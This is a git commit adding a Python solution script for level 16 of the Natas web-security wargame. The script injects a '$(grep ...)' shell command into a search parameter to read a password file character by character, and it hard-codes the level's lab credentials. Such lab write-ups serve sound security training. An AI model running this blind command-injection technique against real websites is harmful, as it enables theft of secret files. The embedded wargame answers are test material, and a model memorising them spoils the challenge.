35482be11839c2c14171430281538b60abd04fc5
omega-coder <fy_cherief@esi.dz>
2019-04-04 05:49:47 +0200

    Adds full source code solution for level 16

--- Natas/level16/solve.py
+++ Natas/level16/solve.py
@@ -2,4 +2,24 @@
 
 # coding : utf-8
 
+import requests
+import string
 
+pass_charset = string.ascii_letters + string.digits
+NATAS16_URL = "http://natas16.natas.labs.overthewire.org/"
+password = ""
+
+session = requests.Session()
+session.auth = ('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh')
+
+param = {'needle': ''}
+
+while len(password) != 32:
+    for c in pass_charset:
+        param['needle'] = 'omega$(grep ^'+ password + c + ' /etc/natas_webpass/natas17)'
+        res = session.get(NATAS16_URL, params=param)
+        if "omega" not in res.text:
+            password += c
+            print("current pass: {}".format(password))
+        else:
+            continue
